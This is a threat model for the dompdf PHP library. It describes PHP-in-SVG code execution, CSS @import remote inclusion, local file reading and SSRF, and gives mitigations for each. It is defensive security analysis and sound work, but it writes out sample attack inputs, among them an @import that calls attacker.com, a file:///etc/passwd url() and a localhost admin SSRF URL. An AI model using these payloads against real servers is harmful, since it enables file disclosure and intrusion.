# Threat Model Analysis for dompdf/dompdf

## Threat: [Remote Code Execution (RCE) via PHP Code Injection in SVG](./threats/remote_code_execution__rce__via_php_code_injection_in_svg.md)

*   **Description:** An attacker crafts a malicious SVG image containing embedded PHP code. If Dompdf's `DOMPDF_ENABLE_PHP` is enabled (which it *should not be* in production), and the SVG is processed, the embedded PHP code could be executed on the server. This leverages Dompdf's (mis)configuration to achieve RCE.
*   **Impact:** Complete server compromise. The attacker could gain full control of the server.
*   **Affected Dompdf Component:** SVG rendering engine (`lib/php-svg-lib`), critically dependent on the `DOMPDF_ENABLE_PHP` setting.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Disable PHP inlining:** Ensure `DOMPDF_ENABLE_PHP` is set to `false` in your Dompdf configuration. This is the *primary* mitigation.
    *   Sanitize SVG input: Use a dedicated SVG sanitizer, even though PHP inlining should be disabled.

## Threat: [Remote File Inclusion (RFI) via CSS @import](./threats/remote_file_inclusion__rfi__via_css_@import.md)

*   **Description:** An attacker injects CSS containing `@import url("http://attacker.com/malicious.css");`. If `DOMPDF_ENABLE_REMOTE` is enabled, Dompdf will fetch and *execute* the remote CSS file. This is a direct exploitation of Dompdf's remote file fetching capability.
*   **Impact:** Data exfiltration, Server-Side Request Forgery (SSRF), potential for limited code execution (if the attacker controls the included CSS and can exploit further vulnerabilities *within Dompdf's CSS parsing*).
*   **Affected Dompdf Component:** CSS parsing and handling (`src/Css/Stylesheet.php`, `src/FrameDecorator/AbstractFrameDecorator.php`), specifically the handling of `@import` rules and the `DOMPDF_ENABLE_REMOTE` setting.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Disable remote file access:** Set `DOMPDF_ENABLE_REMOTE` to `false`. This is the most important mitigation.
    *   Sanitize CSS input: Remove or carefully validate all `@import` directives (even with remote access disabled, as a defense-in-depth measure).

## Threat: [Local File Inclusion (LFI) via CSS url()](./threats/local_file_inclusion__lfi__via_css_url__.md)

*   **Description:** An attacker injects CSS containing `url("file:///etc/passwd")`. Dompdf might attempt to load the specified local file. The success depends directly on `DOMPDF_CHROOT` and file permissions, making this a Dompdf-specific configuration issue.
*   **Impact:** Disclosure of sensitive local files.
*   **Affected Dompdf Component:** CSS parsing and handling (`src/Css/Stylesheet.php`), specifically the handling of `url()` functions and the `DOMPDF_CHROOT` setting.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Set `DOMPDF_CHROOT`:** Configure `DOMPDF_CHROOT` to a restricted, dedicated directory. This is the primary Dompdf-specific mitigation.
    *   Sanitize CSS input: Remove or carefully validate all `url()` functions, especially those using the `file://` protocol (defense-in-depth).

## Threat: [Server-Side Request Forgery (SSRF) via CSS url() or @import](./threats/server-side_request_forgery__ssrf__via_css_url___or_@import.md)

*   **Description:** The attacker uses `url()` or `@import` to make Dompdf send requests to internal services (e.g., `url("http://localhost:8080/admin")`). This directly exploits Dompdf's handling of URLs in CSS, especially when `DOMPDF_ENABLE_REMOTE` is enabled.
*   **Impact:** Access to internal services, potential for data exfiltration, reconnaissance.
*   **Affected Dompdf Component:** CSS parsing and handling (`src/Css/Stylesheet.php`), specifically the handling of `url()` and `@import`, and the `DOMPDF_ENABLE_REMOTE` setting.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Disable remote file access:** Set `DOMPDF_ENABLE_REMOTE` to `false`. This is the primary mitigation.
    *   Sanitize CSS input: Remove or carefully validate all `url()` and `@import` directives (defense-in-depth).

## Threat: [Unintended HTML/JavaScript Execution (if enabled)](./threats/unintended_htmljavascript_execution__if_enabled_.md)

*   **Description:** If `DOMPDF_ENABLE_JAVASCRIPT` is enabled (which it should *not* be), and the input HTML contains JavaScript, Dompdf might attempt to execute that JavaScript. This is a direct consequence of enabling a dangerous Dompdf feature.
*   **Impact:** Potential for XSS-like attacks within the PDF rendering context.
*   **Affected Dompdf Component:** JavaScript handling (if enabled).
*   **Risk Severity:** High (if enabled)
*   **Mitigation Strategies:**
    *   **Disable JavaScript:** Ensure `DOMPDF_ENABLE_JAVASCRIPT` is set to `false` (the default and recommended setting).
    *   Sanitize HTML input: Remove all `<script>` tags and JavaScript event handlers (defense-in-depth).

